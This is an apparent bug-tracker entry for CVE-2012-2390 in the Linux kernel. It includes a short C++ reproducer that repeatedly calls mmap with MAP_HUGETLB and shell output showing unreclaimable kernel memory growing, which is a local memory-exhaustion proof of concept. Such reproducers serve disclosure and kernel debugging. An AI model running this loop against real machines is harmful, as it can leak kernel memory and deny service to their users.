bugzilla: Bug 824351 - CVE-2012-2390
see http://marc.info/?l=linux-mm&m=133728900729735&w=2


--------
#include <sys/mman.h>
#include <stdlib.h>

#ifndef MAP_HUGETLB
#define MAP_HUGETLB 0x0040000
#endif

int main() {
    for (int i=0; i!=10000000; ++i) {
        void* ptr=mmap(NULL, 2*1024*1024, PROT_READ|PROT_WRITE, \
MAP_PRIVATE|MAP_ANONYMOUS|MAP_HUGETLB, 0, 0);  if (ptr!=MAP_FAILED) abort();
    }
    return 0;
}

-------


g++ -O2 test.cpp && echo good
good

$ egrep 'SUnreclaim|HugePages_Total' /proc/meminfo
SUnreclaim:      1900756 kB
HugePages_Total:       0

$ ./a.out && echo good
good

$ egrep 'SUnreclaim|HugePages_Total' /proc/meminfo
SUnreclaim:      2213268 kB
HugePages_Total:       0
